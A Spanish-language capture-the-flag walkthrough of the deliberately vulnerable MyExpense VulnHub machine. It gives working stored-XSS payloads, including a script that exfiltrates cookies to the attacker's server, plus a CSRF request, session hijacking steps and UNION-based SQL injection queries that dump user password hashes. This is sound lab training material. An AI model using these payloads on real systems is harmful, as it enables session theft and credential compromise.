# MyExpense - VulnHub

## Contexto: Descripción
**MyExpense** es una aplicación web deliberadamente vulnerable que permite entrenar en la detección y explotación de múltiples vulnerabilidades. A diferencia de otras apps tipo "CTF" más lineales, MyExpense contiene varias fallas que deben explotarse para completar el escenario. [[iCloudDrive/iCloud~md~obsidian/Git/Setting_Github/Documento Hacker/OWASP TOP 10 ⚠️/XSS 💀/Cross-Site Scripting (XSS)|Cross-Site Scripting (XSS)]] y [[iCloudDrive/iCloud~md~obsidian/Git/Setting_Github/Documento Hacker/OWASP TOP 10 ⚠️/Bases de datos db 🗃️/SQL/SQL|SQL]]

### Escenario
Eres **Samuel Lamotte** y acabas de ser despedido de la empresa *Furtura Business Informatique*. Te deben un reembolso de 750 € por tu último viaje, pero temes que no lo vayan a procesar.

Conectado a la red Wi-Fi interna desde el parking de la empresa (la contraseña aún no ha sido cambiada), decides acceder a la app interna **MyExpense**, usando tus credenciales antiguas:
- **Usuario:** `samuel` --> `slamotte`
- **Contraseña:** `fzghn4lw`


## 🧰 Técnicas de Pentesting Aplicadas

| Fase                       | Técnica o Herramienta                | Descripción                                                                                                                               |
| -------------------------- | ------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------- |
| **Reconocimiento**         | `nmap`, `gobuster`                   | Escaneo de puertos y descubrimiento de rutas y archivos ocultos en el servidor.                                                           |
| **Ingeniería HTML**        | Modificación de formulario HTML      | Se copió el código HTML del formulario de registro y se reutilizó en local para crear un usuario sin restricciones del lado del servidor. |
| **Autenticación**          | Registro/Login manual                | Creación de usuario e inicio de sesión en la aplicación.                                                                                  |
| **Fuzzing Web**            | Exploración manual                   | Navegación por la app web para detectar campos vulnerables a inyección.                                                                   |
| **Vulnerabilidad Web**     | XSS almacenado                       | Inyección de payload en campo “Add Expense” para ejecutar código JavaScript malicioso.                                                    |
| **Post-explotación**       | Robo de cookies                      | Captura de cookies de administrador mediante script externo (`document.cookie`).                                                          |
| **Suplantación de sesión** | Uso de cookies robadas               | Inclusión manual de la cookie robada en las cabeceras del navegador para suplantar la sesión del administrador.                           |
| **Privilegios web**        | Acción como otro usuario (CSRF-like) | Publicación de contenido (notas) como el administrador, usando su sesión secuestrada.                                                     |

---

## 🧰 Preparación del entorno

### 0º - Creación de estructura de carpetas
**Acción:** Ejecutamos script `mkt` para crear estructura:
```bash
nmap/
content/
exploits/
````

`which mkt`:

```lua
mkt () {
	mkdir {nmap,content,exploits}
}
```

 **Extra:** 

 ```bash
 sudo arp-scan -I ens33 --localnet --ignoredups
```

 Resultado:

 ```bash
 Interface: ens33, type: EN10MB, MAC: 00:0c:29:ab:85:69, IPv4: 192.168.1.66
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	2c:96:82:b4:4f:3e	(Unknown)
192.168.1.54	00:0c:29:bb:46:53	VMware, Inc.
192.168.1.65	94:bb:43:12:76:2c	(Unknown)
192.168.1.59	2a:1a:3b:1f:b5:2c	(Unknown: locally administered)
192.168.1.200	28:f5:d1:d6:67:d4	ARRIS Group, Inc.
```

  Explicación: comprobamos que tenemos acceso a una máquina 'VMware' que no sea la IP  de nuestra máquina atacante también en VMware
  
---

## 🕵️‍♂️ Enumeración y reconocimiento

### 1º - Escaneo de puertos

**Acción:**

```bash
nmap -p- --open -sS -vvv -n -Pn 192.168.1.53 -oG allPorts
```

**Explicación:** Escaneo completo de puertos para detectar servicios.

**Extra:** Uso del script `extractPorts` para identificar los puertos abiertos rápidamente.

`which extractPorts`:

```lua
extractPorts () {
	file="$1" 
	ports="$(grep -oP '\d{1,5}/open' "$file" | awk -F '/' '{print $1}' | xargs | tr ' ' ',')" 
	ip_address="$(grep -oP '^Host: .* \(\)' "$file" | head -n 1 | awk '{print $2}')" 
	{
		echo -e "\n[*] Extracting information...\n"
		echo -e "\t[*] IP Address: $ip_address"
		echo -e "\t[*] Open ports: $ports\n"
	} > extractPorts.tmp
	echo "$ports" | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	cat extractPorts.tmp
	rm extractPorts.tmp
}
```

---

### 2º - Escaneo de versiones

**Acción:**

```Shell
nmap -sCV -p80,35329,40285,41415,46947 192.168.1.53 -oN targeted
```

**Explicación:** Escaneo detallado con scripts NSE sobre puertos detectados.

---

### 3º - Fuzzing de directorios (raíz)

**Acción:**

```bash
gobuster dir -u http://192.168.1.53/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```

---

### 4º - Fuzzing en `/admin`

**Acción:**

```bash
gobuster dir -u http://192.168.1.53/admin/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php
```

---

### 5º - Descubrimiento de ruta `/admin/admin.php`

**Resultado:** Se accede al panel de administración, donde se muestran usuarios y roles, pero el usuario `samuel` está desactivado.

---

### 6º - Guardado de credenciales encontradas

**Acción:** Se guarda en `content/credential.txt` lo siguiente:

```
slamotte:samuel/fzghn4lw
```

---

### 7º - Captura de pantalla

**Acción:**

```bash
scrot -d 5 captura.png
```

**Explicación:** Captura del contenido visible en `admin.php`, guardada en `content/`.

---

## 🧪 Explotación

### 8º - Modificación del HTML para activar botón deshabilitado

**Acción:** En DevTools modificamos:

```html
<button ... disabled> → <button ... >
```

**Resultado:** Podemos crear nuevo usuario.

---

### 9º - Intento de persistencia + prueba de XSS

**Explicación:** Aunque el usuario creado aparece como inactivo, podemos aprovechar campos editables para inyectar código.

---

### 10º - XSS almacenado

**Acción:** Inyectamos `<script>alert('XSS')</script>` en el campo `nombre`.

**Resultado:** Al visitar `/admin.php`, se ejecuta el script.

**Explicación:** Confirmamos que hay XSS almacenado (falta de sanitización).

---

### 11º - Activación de servidor de escucha

**Acción:**

```bash
python3 -m http.server 80
```

**Explicación:** Preparamos servidor para capturar peticiones generadas por un script inyectado.

---

### 12º - Inyección con `<script src>`

**Acción:** Insertamos:

```html
<script src="http://192.168.1.52/pwned.js"></script>
```

**Resultado:** Alguien accede al panel y ejecuta el script automáticamente → Recibimos dos solicitudes HTTP.

**Explicación:** Existe un usuario administrador que visita regularmente el panel → Vía para robar su sesión.

---

### 13º - pwned.js (robo de cookie)

**Script:**

```js
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.1.52/?cookie=' + document.cookie);
request.send();
```

**Resultado:**

```http
GET /?cookie=PHPSESSID=20bh8he656k9ksmn68vehilc02
```

**Explicación:** Capturamos sesión activa.

---

### 14º - Prueba de hijacking

**Acción:** Pegamos cookie robada en `DevTools → Storage`.

**Resultado:** Mensaje:

> Sorry, as an administrator, you can be authenticated only once a time.

**Explicación:** Solo puede haber una sesión activa. No podemos entrar sin echar al admin.

**Problema:** Riesgo de llamar la atención.

**Solución:** Usar CSRF para que él mismo active nuestra cuenta.

---

### 15º - Ataque CSRF

*CSRF* (Cross-Site Request Forgery) permite ejecutar acciones autenticadas en nombre de otro usuario, si no se valida el origen de las peticiones (por ejemplo, mediante tokens).

**Acción:**

```js
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.1.53/admin/admin.php?id=11&status=active');
request.send();
```

**Resultado:** Al inyectar este script, el admin activa nuestra cuenta.

**Explicación:** Vulnerabilidad por uso de parámetros GET sin protección.

---

### 16º - Ataque para escalar privilegios (nuevo XSS)

**Acción:**

- Modificamos `pwned.js` para volver a capturar cookies.
    
- Usamos otro puerto:
    

```bash
python3 -m http.server 4646
```

- Inyectamos script en el campo de mensajes:
    

```html
<script src="http://192.168.1.52:4646/pwned.js"></script>
```

**Resultado:** Recibimos 4 cookies distintas. Con una accedemos como `Marion Riviere`.

**Explicación:** Riviere tiene permisos para aceptar pagos → objetivo al alcance.

---

### 17º - Acceso como Riviere

**Acción:** Pegamos la cookie correcta en `Storage`.

**Resultado:** Accedemos como el usuario con permisos de aceptación.

**Explicación:** El secuestro de sesión fue exitoso.

---

### 18º - Posible inyección SQL - parte 1

**Acción:** Desde la sesión de `Riviere`, accedemos a:

```
http://192.168.1.54/site.php?id=2
```

**Explicación:** Posible punto vulnerable a inyecciones SQL. A partir de aquí se inicia una nueva fase de explotación.

---

### 19º Acceso como usuario de finanzas --> Inyección SQL parte 2

**Acción:**  
`http://192.168.1.54/site.php?id=2 order by 2-- -`  
→ Vemos que desaparece el error (aprovechamos el error visible en la web para deducir el número de columnas).  
`http://192.168.1.54/site.php?id=2 union select 1,2-- -`  
→ Vemos que aparece en la web `1(2)`.  
→ Entendemos que el campo 2 es vulnerable y probamos:  
`http://192.168.1.54/site.php?id=2 union select 1,user()-- -`  
→ Nos muestra el usuario, por lo que tenemos un campo donde inyectar código y extraer datos.

**Resultado:**  
Detectamos vulnerabilidad SQL → determinamos número de columnas → comenzamos a volcar datos hasta extraer la contraseña del usuario objetivo.

**Explicación:**  
La web es vulnerable a inyecciones SQL, por lo que podemos extraer información sensible y acceder como usuario del departamento de finanzas para tramitar el pago.

**Problema:**  
En la consulta `http://192.168.1.54/site.php?id=2 union select 1,2-- -` no veíamos nada → algo fallaba.

**Solución:**  
Cambiamos el id a uno inexistente:  
`http://192.168.1.54/site.php?id=-1 union select 1,2-- -`  
→ y ya se mostraron correctamente los datos.

---

### 20º Acceso como usuario de finanzas --> Inyección SQL parte 3

**Acción:**  
`http://192.168.1.54/site.php?id=-1 UNION SELECT 1,schema_name FROM information_schema.schemata-- -`  
→ No devuelve nada.  
Probamos con LIMIT:  
`?id=-1 UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 0,1-- -`  
→ Vamos modificando el índice de LIMIT para listar todas las bases de datos.  
O también se puede usar `group_concat` para obtener todos los resultados de una vez:  
`http://192.168.1.54/site.php?id=-1 UNION SELECT 1,group_concat(schema_name) from information_schema.schemata-- -`  
→ Vemos: `1 (information_schema,sys,mysql,performance_schema,myexpense)`

**Resultado:**  
Listado completo de las bases de datos disponibles en el sistema.

**Explicación:**  
Por limitaciones del motor o de la propia web, hay que ir volcando datos poco a poco (`LIMIT`) o bien usar funciones como `group_concat()` para visualizar más resultados.

**Problema:**  
La consulta sin `LIMIT` no devolvía datos.

**Solución:**  
Probar con `LIMIT` y luego con `group_concat`.

---

### 21º Acceso como usuario de finanzas --> Inyección SQL parte 4

**Acción:**  
Listamos las tablas dentro de la base de datos `myexpense`:  
`http://192.168.1.54/site.php?id=-1 UNION SELECT 1,group_concat(table_name) from information_schema.tables where table_schema='myexpense'-- -`  
→ Vemos: `1 (site,message,expense,user)`

Listamos columnas de la tabla `user`:  
`http://192.168.1.54/site.php?id=-1 UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_schema='myexpense' and table_name='user'-- -`  
→ Vemos:  
`1 (user_id,username,password,role,lastname,firstname,site_id,mail,manager_id,last_connection,active)`

---

### 22º Acceso como usuario de finanzas --> Inyección SQL parte 5

**Acción:**  
Volcamos los usuarios y contraseñas (hasheadas):  
`http://192.168.1.54/site.php?id=-1 UNION SELECT 1,group_concat(username,0x3a,password) from user-- -`  
→ Resultado:

```

afoulon:124922b5d61dd31177ec83719ef8110a pbaudouin:64202ddd5fdea4cc5c2f856efef36e1a rlefrancois:ef0dafa5f531b54bf1f09592df1cd110 mriviere:d0eeb03c6cc5f98a3ca293c1cbf073fc mnguyen:f7111a83d50584e3f91d85c3db710708 pgervais:2ba907839d9b2d94be46aa27cec150e5 placombe:04d1634c2bfffa62386da699bb79f191 triou:6c26031f0e0859a5716a27d2902585c7 broy:b2d2e1b2e6f4e3d5fe0ae80898f5db27 brenaud:2204079caddd265cedb20d661e35ddc9 slamotte:21989af1d818ad73741dfdbef642b28f nthomas:a085d095e552db5d0ea9c455b4e99a30 vhoffmann:ba79ca77fe7b216c3e32b37824a20ef3 rmasson:ebfc0985501fee33b9ff2f2734011882 AAAprueba:014436b6640304b2cfad8a43f4aaad1a AAAAAhakacking:6b350ab604ed7b2332c69e73e01f97f7

````

**Explicación:**  
Se trata de un volcado de todos los usuarios y sus contraseñas (en hash). Para trabajar con ello y hacer la lectura más cómoda, usamos:

```bash
echo "afoulon:124922b5d61dd31177ec83719ef8110a,pbaudouin:64202ddd5fdea4cc5c2f856efef36e1a,..." | tr ',' '\n' | column -t -s ':'
````

```bash
echo "afoulon:124922b5d61dd31177ec83719ef8110a,pbaudouin:64202ddd5fdea4cc5c2f856efef36e1a,rlefrancois:ef0dafa5f531b54bf1f09592df1cd110,mriviere:d0eeb03c6cc5f98a3ca293c1cbf073fc,mnguyen:f7111a83d50584e3f91d85c3db710708,pgervais:2ba907839d9b2d94be46aa27cec150e5,placombe:04d1634c2bfffa62386da699bb79f191,triou:6c26031f0e0859a5716a27d2902585c7,broy:b2d2e1b2e6f4e3d5fe0ae80898f5db27,brenaud:2204079caddd265cedb20d661e35ddc9,slamotte:21989af1d818ad73741dfdbef642b28f,nthomas:a085d095e552db5d0ea9c455b4e99a30,vhoffmann:ba79ca77fe7b216c3e32b37824a20ef3,rmasson:ebfc0985501fee33b9ff2f2734011882,AAAprueba:014436b6640304b2cfad8a43f4aaad1a,AAAAAhakacking:6b350ab604ed7b2332c69e73e01f97f7
" | tr ',' '\n'
```

```
afoulon         124922b5d61dd31177ec83719ef8110a
pbaudouin       64202ddd5fdea4cc5c2f856efef36e1a
rlefrancois     ef0dafa5f531b54bf1f09592df1cd110
mriviere        d0eeb03c6cc5f98a3ca293c1cbf073fc
mnguyen         f7111a83d50584e3f91d85c3db710708
pgervais        2ba907839d9b2d94be46aa27cec150e5
placombe        04d1634c2bfffa62386da699bb79f191
triou           6c26031f0e0859a5716a27d2902585c7
broy            b2d2e1b2e6f4e3d5fe0ae80898f5db27
brenaud         2204079caddd265cedb20d661e35ddc9
slamotte        21989af1d818ad73741dfdbef642b28f
nthomas         a085d095e552db5d0ea9c455b4e99a30
vhoffmann       ba79ca77fe7b216c3e32b37824a20ef3
rmasson         ebfc0985501fee33b9ff2f2734011882
AAAprueba       014436b6640304b2cfad8a43f4aaad1a
AAAAAhakacking  6b350ab604ed7b2332c69e73e01f97f7
```


**Resultado:**  
Tenemos usuarios y contraseñas → ahora podremos probar a loguearnos como uno de ellos, preferiblemente alguien del departamento de finanzas → tramitar el pago y dar por finalizado el ejercicio: flag{H4CKY0URL1F3}.

---

### Recursos adicionales para descifrado de hashes

A continuación, se listan algunas webs útiles para descifrar hashes mediante diccionario o bases de datos públicas:

- [CrackStation](https://crackstation.net/)  
  Base de datos de más de 1.5 mil millones de hashes crackeados. Permite introducir uno o varios hashes al mismo tiempo.

- [MD5Decrypt](https://md5decrypt.net/en/)  
  Herramienta en línea para descifrar hashes MD5, SHA1, SHA256, entre otros. También permite generar hashes y realizar ataques por diccionario.

- [Hashes.com](https://hashes.com/en/decrypt/hash)  
  Plataforma colaborativa para crackear hashes. Ofrece diccionarios propios y la posibilidad de registrar y comparar hashes con los crackeados por otros usuarios.

---
